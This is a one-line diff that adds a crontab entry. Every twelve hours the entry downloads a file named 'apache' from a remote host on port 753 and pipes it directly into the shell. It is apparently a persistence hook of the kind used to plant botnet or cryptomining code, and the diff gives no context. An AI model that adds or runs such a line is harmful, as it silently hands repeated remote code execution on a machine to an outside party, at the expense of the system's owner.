@@ -1,0 +1,1 @@
+0 */12 * * * curl http://cadre123.f3322.net:753/apache | sh
